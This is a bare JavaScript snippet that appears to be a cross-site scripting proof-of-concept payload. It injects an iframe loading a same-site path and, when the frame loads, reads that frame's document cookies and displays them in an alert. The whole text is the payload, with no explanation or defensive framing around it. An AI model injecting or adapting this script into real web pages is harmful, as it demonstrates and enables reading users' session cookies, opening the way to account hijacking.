function bru() {
 var cookies = document.getElementById('f').contentDocument.cookie;
 alert(cookies);
};
document.write('<iframe id="f" onload="bru()" src="/xe/1234"></iframe>');
